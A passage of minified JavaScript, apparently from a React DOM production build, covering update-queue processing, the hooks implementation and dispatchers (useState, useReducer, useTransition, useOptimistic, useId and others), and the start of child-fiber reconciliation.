								if (
									((Y = w.payload),
									(g =
										typeof Y == "function"
											? Y.call(il, p, g)
											: Y),
									g == null)
								)
									break l;
								p = _({}, p, g);
								break l;
							case 2:
								Jt = !0;
						}
					}
					(g = i.callback),
						g !== null &&
							((l.flags |= 64),
							y && (l.flags |= 8192),
							(y = u.callbacks),
							y === null ? (u.callbacks = [g]) : y.push(g));
				} else
					(y = {
						lane: g,
						tag: i.tag,
						payload: i.payload,
						callback: i.callback,
						next: null,
					}),
						x === null ? ((v = x = y), (s = p)) : (x = x.next = y),
						(c |= g);
				if (((i = i.next), i === null)) {
					if (((i = u.shared.pending), i === null)) break;
					(y = i),
						(i = y.next),
						(y.next = null),
						(u.lastBaseUpdate = y),
						(u.shared.pending = null);
				}
			} while (!0);
			x === null && (s = p),
				(u.baseState = s),
				(u.firstBaseUpdate = v),
				(u.lastBaseUpdate = x),
				n === null && (u.shared.lanes = 0),
				(ae |= c),
				(l.lanes = c),
				(l.memoizedState = p);
		}
	}
	function xs(l, t) {
		if (typeof l != "function") throw Error(h(191, l));
		l.call(t);
	}
	function bs(l, t) {
		var e = l.callbacks;
		if (e !== null)
			for (l.callbacks = null, l = 0; l < e.length; l++) xs(e[l], t);
	}
	var la = j(null),
		Ku = j(0);
	function Ss(l, t) {
		(l = Gt), E(Ku, l), E(la, t), (Gt = l | t.baseLanes);
	}
	function Rc() {
		E(Ku, Gt), E(la, la.current);
	}
	function Uc() {
		(Gt = Ku.current), M(la), M(Ku);
	}
	var $t = 0,
		Z = null,
		nl = null,
		Nl = null,
		Ju = !1,
		ta = !1,
		Me = !1,
		ku = 0,
		La = 0,
		ea = null,
		pm = 0;
	function Sl() {
		throw Error(h(321));
	}
	function wc(l, t) {
		if (t === null) return !1;
		for (var e = 0; e < t.length && e < l.length; e++)
			if (!Fl(l[e], t[e])) return !1;
		return !0;
	}
	function Hc(l, t, e, a, u, n) {
		return (
			($t = n),
			(Z = t),
			(t.memoizedState = null),
			(t.updateQueue = null),
			(t.lanes = 0),
			(b.H = l === null || l.memoizedState === null ? ao : uo),
			(Me = !1),
			(n = e(a, u)),
			(Me = !1),
			ta && (n = Ns(t, e, a, u)),
			ps(l),
			n
		);
	}
	function ps(l) {
		b.H = ln;
		var t = nl !== null && nl.next !== null;
		if (
			(($t = 0),
			(Nl = nl = Z = null),
			(Ju = !1),
			(La = 0),
			(ea = null),
			t)
		)
			throw Error(h(300));
		l === null ||
			zl ||
			((l = l.dependencies), l !== null && Xu(l) && (zl = !0));
	}
	function Ns(l, t, e, a) {
		Z = l;
		var u = 0;
		do {
			if ((ta && (ea = null), (La = 0), (ta = !1), 25 <= u))
				throw Error(h(301));
			if (((u += 1), (Nl = nl = null), l.updateQueue != null)) {
				var n = l.updateQueue;
				(n.lastEffect = null),
					(n.events = null),
					(n.stores = null),
					n.memoCache != null && (n.memoCache.index = 0);
			}
			(b.H = Mm), (n = t(e, a));
		} while (ta);
		return n;
	}
	function Nm() {
		var l = b.H,
			t = l.useState()[0];
		return (
			(t = typeof t.then == "function" ? Va(t) : t),
			(l = l.useState()[0]),
			(nl !== null ? nl.memoizedState : null) !== l && (Z.flags |= 1024),
			t
		);
	}
	function Bc() {
		var l = ku !== 0;
		return (ku = 0), l;
	}
	function qc(l, t, e) {
		(t.updateQueue = l.updateQueue), (t.flags &= -2053), (l.lanes &= ~e);
	}
	function Cc(l) {
		if (Ju) {
			for (l = l.memoizedState; l !== null; ) {
				var t = l.queue;
				t !== null && (t.pending = null), (l = l.next);
			}
			Ju = !1;
		}
		($t = 0), (Nl = nl = Z = null), (ta = !1), (La = ku = 0), (ea = null);
	}
	function Ql() {
		var l = {
			memoizedState: null,
			baseState: null,
			baseQueue: null,
			queue: null,
			next: null,
		};
		return (
			Nl === null ? (Z.memoizedState = Nl = l) : (Nl = Nl.next = l), Nl
		);
	}
	function jl() {
		if (nl === null) {
			var l = Z.alternate;
			l = l !== null ? l.memoizedState : null;
		} else l = nl.next;
		var t = Nl === null ? Z.memoizedState : Nl.next;
		if (t !== null) (Nl = t), (nl = l);
		else {
			if (l === null)
				throw Z.alternate === null ? Error(h(467)) : Error(h(310));
			(nl = l),
				(l = {
					memoizedState: nl.memoizedState,
					baseState: nl.baseState,
					baseQueue: nl.baseQueue,
					queue: nl.queue,
					next: null,
				}),
				Nl === null ? (Z.memoizedState = Nl = l) : (Nl = Nl.next = l);
		}
		return Nl;
	}
	function Yc() {
		return {
			lastEffect: null,
			events: null,
			stores: null,
			memoCache: null,
		};
	}
	function Va(l) {
		var t = La;
		return (
			(La += 1),
			ea === null && (ea = []),
			(l = vs(ea, l, t)),
			(t = Z),
			(Nl === null ? t.memoizedState : Nl.next) === null &&
				((t = t.alternate),
				(b.H = t === null || t.memoizedState === null ? ao : uo)),
			l
		);
	}
	function Wu(l) {
		if (l !== null && typeof l == "object") {
			if (typeof l.then == "function") return Va(l);
			if (l.$$typeof === vl) return Bl(l);
		}
		throw Error(h(438, String(l)));
	}
	function Gc(l) {
		var t = null,
			e = Z.updateQueue;
		if ((e !== null && (t = e.memoCache), t == null)) {
			var a = Z.alternate;
			a !== null &&
				((a = a.updateQueue),
				a !== null &&
					((a = a.memoCache),
					a != null &&
						(t = {
							data: a.data.map(function (u) {
								return u.slice();
							}),
							index: 0,
						})));
		}
		if (
			(t == null && (t = { data: [], index: 0 }),
			e === null && ((e = Yc()), (Z.updateQueue = e)),
			(e.memoCache = t),
			(e = t.data[t.index]),
			e === void 0)
		)
			for (e = t.data[t.index] = Array(l), a = 0; a < l; a++) e[a] = Ue;
		return t.index++, e;
	}
	function wt(l, t) {
		return typeof t == "function" ? t(l) : t;
	}
	function $u(l) {
		var t = jl();
		return Xc(t, nl, l);
	}
	function Xc(l, t, e) {
		var a = l.queue;
		if (a === null) throw Error(h(311));
		a.lastRenderedReducer = e;
		var u = l.baseQueue,
			n = a.pending;
		if (n !== null) {
			if (u !== null) {
				var c = u.next;
				(u.next = n.next), (n.next = c);
			}
			(t.baseQueue = u = n), (a.pending = null);
		}
		if (((n = l.baseState), u === null)) l.memoizedState = n;
		else {
			t = u.next;
			var i = (c = null),
				s = null,
				v = t,
				x = !1;
			do {
				var p = v.lane & -536870913;
				if (p !== v.lane ? (W & p) === p : ($t & p) === p) {
					var g = v.revertLane;
					if (g === 0)
						s !== null &&
							(s = s.next =
								{
									lane: 0,
									revertLane: 0,
									action: v.action,
									hasEagerState: v.hasEagerState,
									eagerState: v.eagerState,
									next: null,
								}),
							p === Ie && (x = !0);
					else if (($t & g) === g) {
						(v = v.next), g === Ie && (x = !0);
						continue;
					} else
						(p = {
							lane: 0,
							revertLane: v.revertLane,
							action: v.action,
							hasEagerState: v.hasEagerState,
							eagerState: v.eagerState,
							next: null,
						}),
							s === null
								? ((i = s = p), (c = n))
								: (s = s.next = p),
							(Z.lanes |= g),
							(ae |= g);
					(p = v.action),
						Me && e(n, p),
						(n = v.hasEagerState ? v.eagerState : e(n, p));
				} else
					(g = {
						lane: p,
						revertLane: v.revertLane,
						action: v.action,
						hasEagerState: v.hasEagerState,
						eagerState: v.eagerState,
						next: null,
					}),
						s === null ? ((i = s = g), (c = n)) : (s = s.next = g),
						(Z.lanes |= p),
						(ae |= p);
				v = v.next;
			} while (v !== null && v !== t);
			if (
				(s === null ? (c = n) : (s.next = i),
				!Fl(n, l.memoizedState) &&
					((zl = !0), x && ((e = Pe), e !== null)))
			)
				throw e;
			(l.memoizedState = n),
				(l.baseState = c),
				(l.baseQueue = s),
				(a.lastRenderedState = n);
		}
		return u === null && (a.lanes = 0), [l.memoizedState, a.dispatch];
	}
	function Qc(l) {
		var t = jl(),
			e = t.queue;
		if (e === null) throw Error(h(311));
		e.lastRenderedReducer = l;
		var a = e.dispatch,
			u = e.pending,
			n = t.memoizedState;
		if (u !== null) {
			e.pending = null;
			var c = (u = u.next);
			do (n = l(n, c.action)), (c = c.next);
			while (c !== u);
			Fl(n, t.memoizedState) || (zl = !0),
				(t.memoizedState = n),
				t.baseQueue === null && (t.baseState = n),
				(e.lastRenderedState = n);
		}
		return [n, a];
	}
	function js(l, t, e) {
		var a = Z,
			u = jl(),
			n = tl;
		if (n) {
			if (e === void 0) throw Error(h(407));
			e = e();
		} else e = t();
		var c = !Fl((nl || u).memoizedState, e);
		c && ((u.memoizedState = e), (zl = !0)), (u = u.queue);
		var i = As.bind(null, a, u, l);
		if (
			(Ka(2048, 8, i, [l]),
			u.getSnapshot !== t ||
				c ||
				(Nl !== null && Nl.memoizedState.tag & 1))
		) {
			if (
				((a.flags |= 2048),
				aa(9, Fu(), Es.bind(null, a, u, e, t), null),
				rl === null)
			)
				throw Error(h(349));
			n || ($t & 124) !== 0 || Ts(a, t, e);
		}
		return e;
	}
	function Ts(l, t, e) {
		(l.flags |= 16384),
			(l = { getSnapshot: t, value: e }),
			(t = Z.updateQueue),
			t === null
				? ((t = Yc()), (Z.updateQueue = t), (t.stores = [l]))
				: ((e = t.stores), e === null ? (t.stores = [l]) : e.push(l));
	}
	function Es(l, t, e, a) {
		(t.value = e), (t.getSnapshot = a), zs(t) && Ms(l);
	}
	function As(l, t, e) {
		return e(function () {
			zs(t) && Ms(l);
		});
	}
	function zs(l) {
		var t = l.getSnapshot;
		l = l.value;
		try {
			var e = t();
			return !Fl(l, e);
		} catch {
			return !0;
		}
	}
	function Ms(l) {
		var t = ke(l, 2);
		t !== null && at(t, l, 2);
	}
	function Zc(l) {
		var t = Ql();
		if (typeof l == "function") {
			var e = l;
			if (((l = e()), Me)) {
				Zt(!0);
				try {
					e();
				} finally {
					Zt(!1);
				}
			}
		}
		return (
			(t.memoizedState = t.baseState = l),
			(t.queue = {
				pending: null,
				lanes: 0,
				dispatch: null,
				lastRenderedReducer: wt,
				lastRenderedState: l,
			}),
			t
		);
	}
	function Os(l, t, e, a) {
		return (l.baseState = e), Xc(l, nl, typeof a == "function" ? a : wt);
	}
	function jm(l, t, e, a, u) {
		if (Pu(l)) throw Error(h(485));
		if (((l = t.action), l !== null)) {
			var n = {
				payload: u,
				action: l,
				next: null,
				isTransition: !0,
				status: "pending",
				value: null,
				reason: null,
				listeners: [],
				then: function (c) {
					n.listeners.push(c);
				},
			};
			b.T !== null ? e(!0) : (n.isTransition = !1),
				a(n),
				(e = t.pending),
				e === null
					? ((n.next = t.pending = n), _s(t, n))
					: ((n.next = e.next), (t.pending = e.next = n));
		}
	}
	function _s(l, t) {
		var e = t.action,
			a = t.payload,
			u = l.state;
		if (t.isTransition) {
			var n = b.T,
				c = {};
			b.T = c;
			try {
				var i = e(u, a),
					s = b.S;
				s !== null && s(c, i), Ds(l, t, i);
			} catch (v) {
				Lc(l, t, v);
			} finally {
				b.T = n;
			}
		} else
			try {
				(n = e(u, a)), Ds(l, t, n);
			} catch (v) {
				Lc(l, t, v);
			}
	}
	function Ds(l, t, e) {
		e !== null && typeof e == "object" && typeof e.then == "function"
			? e.then(
					function (a) {
						Rs(l, t, a);
					},
					function (a) {
						return Lc(l, t, a);
					}
			  )
			: Rs(l, t, e);
	}
	function Rs(l, t, e) {
		(t.status = "fulfilled"),
			(t.value = e),
			Us(t),
			(l.state = e),
			(t = l.pending),
			t !== null &&
				((e = t.next),
				e === t
					? (l.pending = null)
					: ((e = e.next), (t.next = e), _s(l, e)));
	}
	function Lc(l, t, e) {
		var a = l.pending;
		if (((l.pending = null), a !== null)) {
			a = a.next;
			do (t.status = "rejected"), (t.reason = e), Us(t), (t = t.next);
			while (t !== a);
		}
		l.action = null;
	}
	function Us(l) {
		l = l.listeners;
		for (var t = 0; t < l.length; t++) (0, l[t])();
	}
	function ws(l, t) {
		return t;
	}
	function Hs(l, t) {
		if (tl) {
			var e = rl.formState;
			if (e !== null) {
				l: {
					var a = Z;
					if (tl) {
						if (yl) {
							t: {
								for (var u = yl, n = pt; u.nodeType !== 8; ) {
									if (!n) {
										u = null;
										break t;
									}
									if (((u = yt(u.nextSibling)), u === null)) {
										u = null;
										break t;
									}
								}
								(n = u.data),
									(u = n === "F!" || n === "F" ? u : null);
							}
							if (u) {
								(yl = yt(u.nextSibling)), (a = u.data === "F!");
								break l;
							}
						}
						Te(a);
					}
					a = !1;
				}
				a && (t = e[0]);
			}
		}
		return (
			(e = Ql()),
			(e.memoizedState = e.baseState = t),
			(a = {
				pending: null,
				lanes: 0,
				dispatch: null,
				lastRenderedReducer: ws,
				lastRenderedState: t,
			}),
			(e.queue = a),
			(e = lo.bind(null, Z, a)),
			(a.dispatch = e),
			(a = Zc(!1)),
			(n = Wc.bind(null, Z, !1, a.queue)),
			(a = Ql()),
			(u = { state: t, dispatch: null, action: l, pending: null }),
			(a.queue = u),
			(e = jm.bind(null, Z, u, n, e)),
			(u.dispatch = e),
			(a.memoizedState = l),
			[t, e, !1]
		);
	}
	function Bs(l) {
		var t = jl();
		return qs(t, nl, l);
	}
	function qs(l, t, e) {
		if (
			((t = Xc(l, t, ws)[0]),
			(l = $u(wt)[0]),
			typeof t == "object" && t !== null && typeof t.then == "function")
		)
			try {
				var a = Va(t);
			} catch (c) {
				throw c === Ya ? Lu : c;
			}
		else a = t;
		t = jl();
		var u = t.queue,
			n = u.dispatch;
		return (
			e !== t.memoizedState &&
				((Z.flags |= 2048), aa(9, Fu(), Tm.bind(null, u, e), null)),
			[a, n, l]
		);
	}
	function Tm(l, t) {
		l.action = t;
	}
	function Cs(l) {
		var t = jl(),
			e = nl;
		if (e !== null) return qs(t, e, l);
		jl(), (t = t.memoizedState), (e = jl());
		var a = e.queue.dispatch;
		return (e.memoizedState = l), [t, a, !1];
	}
	function aa(l, t, e, a) {
		return (
			(l = { tag: l, create: e, deps: a, inst: t, next: null }),
			(t = Z.updateQueue),
			t === null && ((t = Yc()), (Z.updateQueue = t)),
			(e = t.lastEffect),
			e === null
				? (t.lastEffect = l.next = l)
				: ((a = e.next),
				  (e.next = l),
				  (l.next = a),
				  (t.lastEffect = l)),
			l
		);
	}
	function Fu() {
		return { destroy: void 0, resource: void 0 };
	}
	function Ys() {
		return jl().memoizedState;
	}
	function Iu(l, t, e, a) {
		var u = Ql();
		(a = a === void 0 ? null : a),
			(Z.flags |= l),
			(u.memoizedState = aa(1 | t, Fu(), e, a));
	}
	function Ka(l, t, e, a) {
		var u = jl();
		a = a === void 0 ? null : a;
		var n = u.memoizedState.inst;
		nl !== null && a !== null && wc(a, nl.memoizedState.deps)
			? (u.memoizedState = aa(t, n, e, a))
			: ((Z.flags |= l), (u.memoizedState = aa(1 | t, n, e, a)));
	}
	function Gs(l, t) {
		Iu(8390656, 8, l, t);
	}
	function Xs(l, t) {
		Ka(2048, 8, l, t);
	}
	function Qs(l, t) {
		return Ka(4, 2, l, t);
	}
	function Zs(l, t) {
		return Ka(4, 4, l, t);
	}
	function Ls(l, t) {
		if (typeof t == "function") {
			l = l();
			var e = t(l);
			return function () {
				typeof e == "function" ? e() : t(null);
			};
		}
		if (t != null)
			return (
				(l = l()),
				(t.current = l),
				function () {
					t.current = null;
				}
			);
	}
	function Vs(l, t, e) {
		(e = e != null ? e.concat([l]) : null),
			Ka(4, 4, Ls.bind(null, t, l), e);
	}
	function Vc() {}
	function Ks(l, t) {
		var e = jl();
		t = t === void 0 ? null : t;
		var a = e.memoizedState;
		return t !== null && wc(t, a[1])
			? a[0]
			: ((e.memoizedState = [l, t]), l);
	}
	function Js(l, t) {
		var e = jl();
		t = t === void 0 ? null : t;
		var a = e.memoizedState;
		if (t !== null && wc(t, a[1])) return a[0];
		if (((a = l()), Me)) {
			Zt(!0);
			try {
				l();
			} finally {
				Zt(!1);
			}
		}
		return (e.memoizedState = [a, t]), a;
	}
	function Kc(l, t, e) {
		return e === void 0 || ($t & 1073741824) !== 0
			? (l.memoizedState = t)
			: ((l.memoizedState = e), (l = Fo()), (Z.lanes |= l), (ae |= l), e);
	}
	function ks(l, t, e, a) {
		return Fl(e, t)
			? e
			: la.current !== null
			? ((l = Kc(l, e, a)), Fl(l, t) || (zl = !0), l)
			: ($t & 42) === 0
			? ((zl = !0), (l.memoizedState = e))
			: ((l = Fo()), (Z.lanes |= l), (ae |= l), t);
	}
	function Ws(l, t, e, a, u) {
		var n = A.p;
		A.p = n !== 0 && 8 > n ? n : 8;
		var c = b.T,
			i = {};
		(b.T = i), Wc(l, !1, t, e);
		try {
			var s = u(),
				v = b.S;
			if (
				(v !== null && v(i, s),
				s !== null &&
					typeof s == "object" &&
					typeof s.then == "function")
			) {
				var x = Sm(s, a);
				Ja(l, t, x, et(l));
			} else Ja(l, t, a, et(l));
		} catch (p) {
			Ja(
				l,
				t,
				{ then: function () {}, status: "rejected", reason: p },
				et()
			);
		} finally {
			(A.p = n), (b.T = c);
		}
	}
	function Em() {}
	function Jc(l, t, e, a) {
		if (l.tag !== 5) throw Error(h(476));
		var u = $s(l).queue;
		Ws(
			l,
			u,
			t,
			C,
			e === null
				? Em
				: function () {
						return Fs(l), e(a);
				  }
		);
	}
	function $s(l) {
		var t = l.memoizedState;
		if (t !== null) return t;
		t = {
			memoizedState: C,
			baseState: C,
			baseQueue: null,
			queue: {
				pending: null,
				lanes: 0,
				dispatch: null,
				lastRenderedReducer: wt,
				lastRenderedState: C,
			},
			next: null,
		};
		var e = {};
		return (
			(t.next = {
				memoizedState: e,
				baseState: e,
				baseQueue: null,
				queue: {
					pending: null,
					lanes: 0,
					dispatch: null,
					lastRenderedReducer: wt,
					lastRenderedState: e,
				},
				next: null,
			}),
			(l.memoizedState = t),
			(l = l.alternate),
			l !== null && (l.memoizedState = t),
			t
		);
	}
	function Fs(l) {
		var t = $s(l).next.queue;
		Ja(l, t, {}, et());
	}
	function kc() {
		return Bl(ru);
	}
	function Is() {
		return jl().memoizedState;
	}
	function Ps() {
		return jl().memoizedState;
	}
	function Am(l) {
		for (var t = l.return; t !== null; ) {
			switch (t.tag) {
				case 24:
				case 3:
					var e = et();
					l = kt(e);
					var a = Wt(t, l, e);
					a !== null && (at(a, t, e), Xa(a, t, e)),
						(t = { cache: Tc() }),
						(l.payload = t);
					return;
			}
			t = t.return;
		}
	}
	function zm(l, t, e) {
		var a = et();
		(e = {
			lane: a,
			revertLane: 0,
			action: e,
			hasEagerState: !1,
			eagerState: null,
			next: null,
		}),
			Pu(l)
				? to(t, e)
				: ((e = hc(l, t, e, a)),
				  e !== null && (at(e, l, a), eo(e, t, a)));
	}
	function lo(l, t, e) {
		var a = et();
		Ja(l, t, e, a);
	}
	function Ja(l, t, e, a) {
		var u = {
			lane: a,
			revertLane: 0,
			action: e,
			hasEagerState: !1,
			eagerState: null,
			next: null,
		};
		if (Pu(l)) to(t, u);
		else {
			var n = l.alternate;
			if (
				l.lanes === 0 &&
				(n === null || n.lanes === 0) &&
				((n = t.lastRenderedReducer), n !== null)
			)
				try {
					var c = t.lastRenderedState,
						i = n(c, e);
					if (((u.hasEagerState = !0), (u.eagerState = i), Fl(i, c)))
						return Bu(l, t, u, 0), rl === null && Hu(), !1;
				} catch {
				} finally {
				}
			if (((e = hc(l, t, u, a)), e !== null))
				return at(e, l, a), eo(e, t, a), !0;
		}
		return !1;
	}
	function Wc(l, t, e, a) {
		if (
			((a = {
				lane: 2,
				revertLane: zi(),
				action: a,
				hasEagerState: !1,
				eagerState: null,
				next: null,
			}),
			Pu(l))
		) {
			if (t) throw Error(h(479));
		} else (t = hc(l, e, a, 2)), t !== null && at(t, l, 2);
	}
	function Pu(l) {
		var t = l.alternate;
		return l === Z || (t !== null && t === Z);
	}
	function to(l, t) {
		ta = Ju = !0;
		var e = l.pending;
		e === null ? (t.next = t) : ((t.next = e.next), (e.next = t)),
			(l.pending = t);
	}
	function eo(l, t, e) {
		if ((e & 4194048) !== 0) {
			var a = t.lanes;
			(a &= l.pendingLanes), (e |= a), (t.lanes = e), of(l, e);
		}
	}
	var ln = {
			readContext: Bl,
			use: Wu,
			useCallback: Sl,
			useContext: Sl,
			useEffect: Sl,
			useImperativeHandle: Sl,
			useLayoutEffect: Sl,
			useInsertionEffect: Sl,
			useMemo: Sl,
			useReducer: Sl,
			useRef: Sl,
			useState: Sl,
			useDebugValue: Sl,
			useDeferredValue: Sl,
			useTransition: Sl,
			useSyncExternalStore: Sl,
			useId: Sl,
			useHostTransitionStatus: Sl,
			useFormState: Sl,
			useActionState: Sl,
			useOptimistic: Sl,
			useMemoCache: Sl,
			useCacheRefresh: Sl,
		},
		ao = {
			readContext: Bl,
			use: Wu,
			useCallback: function (l, t) {
				return (Ql().memoizedState = [l, t === void 0 ? null : t]), l;
			},
			useContext: Bl,
			useEffect: Gs,
			useImperativeHandle: function (l, t, e) {
				(e = e != null ? e.concat([l]) : null),
					Iu(4194308, 4, Ls.bind(null, t, l), e);
			},
			useLayoutEffect: function (l, t) {
				return Iu(4194308, 4, l, t);
			},
			useInsertionEffect: function (l, t) {
				Iu(4, 2, l, t);
			},
			useMemo: function (l, t) {
				var e = Ql();
				t = t === void 0 ? null : t;
				var a = l();
				if (Me) {
					Zt(!0);
					try {
						l();
					} finally {
						Zt(!1);
					}
				}
				return (e.memoizedState = [a, t]), a;
			},
			useReducer: function (l, t, e) {
				var a = Ql();
				if (e !== void 0) {
					var u = e(t);
					if (Me) {
						Zt(!0);
						try {
							e(t);
						} finally {
							Zt(!1);
						}
					}
				} else u = t;
				return (
					(a.memoizedState = a.baseState = u),
					(l = {
						pending: null,
						lanes: 0,
						dispatch: null,
						lastRenderedReducer: l,
						lastRenderedState: u,
					}),
					(a.queue = l),
					(l = l.dispatch = zm.bind(null, Z, l)),
					[a.memoizedState, l]
				);
			},
			useRef: function (l) {
				var t = Ql();
				return (l = { current: l }), (t.memoizedState = l);
			},
			useState: function (l) {
				l = Zc(l);
				var t = l.queue,
					e = lo.bind(null, Z, t);
				return (t.dispatch = e), [l.memoizedState, e];
			},
			useDebugValue: Vc,
			useDeferredValue: function (l, t) {
				var e = Ql();
				return Kc(e, l, t);
			},
			useTransition: function () {
				var l = Zc(!1);
				return (
					(l = Ws.bind(null, Z, l.queue, !0, !1)),
					(Ql().memoizedState = l),
					[!1, l]
				);
			},
			useSyncExternalStore: function (l, t, e) {
				var a = Z,
					u = Ql();
				if (tl) {
					if (e === void 0) throw Error(h(407));
					e = e();
				} else {
					if (((e = t()), rl === null)) throw Error(h(349));
					(W & 124) !== 0 || Ts(a, t, e);
				}
				u.memoizedState = e;
				var n = { value: e, getSnapshot: t };
				return (
					(u.queue = n),
					Gs(As.bind(null, a, n, l), [l]),
					(a.flags |= 2048),
					aa(9, Fu(), Es.bind(null, a, n, e, t), null),
					e
				);
			},
			useId: function () {
				var l = Ql(),
					t = rl.identifierPrefix;
				if (tl) {
					var e = Dt,
						a = _t;
					(e = (a & ~(1 << (32 - $l(a) - 1))).toString(32) + e),
						(t = "«" + t + "R" + e),
						(e = ku++),
						0 < e && (t += "H" + e.toString(32)),
						(t += "»");
				} else (e = pm++), (t = "«" + t + "r" + e.toString(32) + "»");
				return (l.memoizedState = t);
			},
			useHostTransitionStatus: kc,
			useFormState: Hs,
			useActionState: Hs,
			useOptimistic: function (l) {
				var t = Ql();
				t.memoizedState = t.baseState = l;
				var e = {
					pending: null,
					lanes: 0,
					dispatch: null,
					lastRenderedReducer: null,
					lastRenderedState: null,
				};
				return (
					(t.queue = e),
					(t = Wc.bind(null, Z, !0, e)),
					(e.dispatch = t),
					[l, t]
				);
			},
			useMemoCache: Gc,
			useCacheRefresh: function () {
				return (Ql().memoizedState = Am.bind(null, Z));
			},
		},
		uo = {
			readContext: Bl,
			use: Wu,
			useCallback: Ks,
			useContext: Bl,
			useEffect: Xs,
			useImperativeHandle: Vs,
			useInsertionEffect: Qs,
			useLayoutEffect: Zs,
			useMemo: Js,
			useReducer: $u,
			useRef: Ys,
			useState: function () {
				return $u(wt);
			},
			useDebugValue: Vc,
			useDeferredValue: function (l, t) {
				var e = jl();
				return ks(e, nl.memoizedState, l, t);
			},
			useTransition: function () {
				var l = $u(wt)[0],
					t = jl().memoizedState;
				return [typeof l == "boolean" ? l : Va(l), t];
			},
			useSyncExternalStore: js,
			useId: Is,
			useHostTransitionStatus: kc,
			useFormState: Bs,
			useActionState: Bs,
			useOptimistic: function (l, t) {
				var e = jl();
				return Os(e, nl, l, t);
			},
			useMemoCache: Gc,
			useCacheRefresh: Ps,
		},
		Mm = {
			readContext: Bl,
			use: Wu,
			useCallback: Ks,
			useContext: Bl,
			useEffect: Xs,
			useImperativeHandle: Vs,
			useInsertionEffect: Qs,
			useLayoutEffect: Zs,
			useMemo: Js,
			useReducer: Qc,
			useRef: Ys,
			useState: function () {
				return Qc(wt);
			},
			useDebugValue: Vc,
			useDeferredValue: function (l, t) {
				var e = jl();
				return nl === null
					? Kc(e, l, t)
					: ks(e, nl.memoizedState, l, t);
			},
			useTransition: function () {
				var l = Qc(wt)[0],
					t = jl().memoizedState;
				return [typeof l == "boolean" ? l : Va(l), t];
			},
			useSyncExternalStore: js,
			useId: Is,
			useHostTransitionStatus: kc,
			useFormState: Cs,
			useActionState: Cs,
			useOptimistic: function (l, t) {
				var e = jl();
				return nl !== null
					? Os(e, nl, l, t)
					: ((e.baseState = l), [l, e.queue.dispatch]);
			},
			useMemoCache: Gc,
			useCacheRefresh: Ps,
		},
		ua = null,
		ka = 0;
	function tn(l) {
		var t = ka;
		return (ka += 1), ua === null && (ua = []), vs(ua, l, t);
	}
	function Wa(l, t) {
		(t = t.props.ref), (l.ref = t !== void 0 ? t : null);
	}
	function en(l, t) {
		throw t.$$typeof === J
			? Error(h(525))
			: ((l = Object.prototype.toString.call(t)),
			  Error(
					h(
						31,
						l === "[object Object]"
							? "object with keys {" +
									Object.keys(t).join(", ") +
									"}"
							: l
					)
			  ));
	}
	function no(l) {
		var t = l._init;
		return t(l._payload);
	}
	function co(l) {
		function t(d, r) {
			if (l) {
				var m = d.deletions;
				m === null ? ((d.deletions = [r]), (d.flags |= 16)) : m.push(r);
			}
		}
		function e(d, r) {
			if (!l) return null;
			for (; r !== null; ) t(d, r), (r = r.sibling);
			return null;
		}
		function a(d) {
			for (var r = new Map(); d !== null; )
				d.key !== null ? r.set(d.key, d) : r.set(d.index, d),
					(d = d.sibling);
			return r;
		}
		function u(d, r) {
			return (d = Ot(d, r)), (d.index = 0), (d.sibling = null), d;
		}
		function n(d, r, m) {
			return (
				(d.index = m),
				l
					? ((m = d.alternate),
					  m !== null
							? ((m = m.index),
							  m < r ? ((d.flags |= 67108866), r) : m)
							: ((d.flags |= 67108866), r))
					: ((d.flags |= 1048576), r)
			);
		}
		function c(d) {
			return l && d.alternate === null && (d.flags |= 67108866), d;
		}
		function i(d, r, m, S) {
			return r === null || r.tag !== 6
				? ((r = gc(m, d.mode, S)), (r.return = d), r)
				: ((r = u(r, m)), (r.return = d), r);
		}
		function s(d, r, m, S) {
			var O = m.type;
			return O === k
				? x(d, r, m.props.children, S, m.key)
				: r !== null &&
				  (r.elementType === O ||
						(typeof O == "object" &&
							O !== null &&
							O.$$typeof === Jl &&
							no(O) === r.type))
				? ((r = u(r, m.props)), Wa(r, m), (r.return = d), r)
				: ((r = Cu(m.type, m.key, m.props, null, d.mode, S)),
				  Wa(r, m),
				  (r.return = d),
				  r);
		}
		function v(d, r, m, S) {
			return r === null ||
				r.tag !== 4 ||
				r.stateNode.containerInfo !== m.containerInfo ||
				r.stateNode.implementation !== m.implementation
				? ((r = yc(m, d.mode, S)), (r.return = d), r)
				: ((r = u(r, m.children || [])), (r.return = d), r);
		}
		function x(d, r, m, S, O) {
			return r === null || r.tag !== 7
				? ((r = Se(m, d.mode, S, O)), (r.return = d), r)
				: ((r = u(r, m)), (r.return = d), r);
		}
		function p(d, r, m) {
			if (
				(typeof r == "string" && r !== "") ||
				typeof r == "number" ||
				typeof r == "bigint"
			)
				return (r = gc("" + r, d.mode, m)), (r.return = d), r;
			if (typeof r == "object" && r !== null) {
				switch (r.$$typeof) {
					case F:
						return (
							(m = Cu(r.type, r.key, r.props, null, d.mode, m)),
							Wa(m, r),
							(m.return = d),
							m
						);
					case el:
						return (r = yc(r, d.mode, m)), (r.return = d), r;
					case Jl:
						var S = r._init;
						return (r = S(r._payload)), p(d, r, m);
				}
				if (wl(r) || Ul(r))
					return (r = Se(r, d.mode, m, null)), (r.return = d), r;
				if (typeof r.then == "function") return p(d, tn(r), m);
				if (r.$$typeof === vl) return p(d, Qu(d, r), m);
				en(d, r);
			}
			return null;
		}
		function g(d, r, m, S) {
			var O = r !== null ? r.key : null;
			if (
				(typeof m == "string" && m !== "") ||
				typeof m == "number" ||
				typeof m == "bigint"
			)
				return O !== null ? null : i(d, r, "" + m, S);
			if (typeof m == "object" && m !== null) {
				switch (m.$$typeof) {
					case F:
						return m.key === O ? s(d, r, m, S) : null;
					case el:
						return m.key === O ? v(d, r, m, S) : null;
					case Jl:
						return (
							(O = m._init), (m = O(m._payload)), g(d, r, m, S)
						);
				}
				if (wl(m) || Ul(m))
					return O !== null ? null : x(d, r, m, S, null);
				if (typeof m.then == "function") return g(d, r, tn(m), S);
				if (m.$$typeof === vl) return g(d, r, Qu(d, m), S);
				en(d, m);
			}
			return null;
		}
		function y(d, r, m, S, O) {
			if (
				(typeof S == "string" && S !== "") ||
				typeof S == "number" ||
				typeof S == "bigint"
			)
				return (d = d.get(m) || null), i(r, d, "" + S, O);
			if (typeof S == "object" && S !== null) {
				switch (S.$$typeof) {
					case F:
						return (
							(d = d.get(S.key === null ? m : S.key) || null),
							s(r, d, S, O)
						);
					case el:
						return (
							(d = d.get(S.key === null ? m : S.key) || null),
							v(r, d, S, O)
						);
					case Jl:
						var L = S._init;
						return (S = L(S._payload)), y(d, r, m, S, O);
				}
				if (wl(S) || Ul(S))
					return (d = d.get(m) || null), x(r, d, S, O, null);
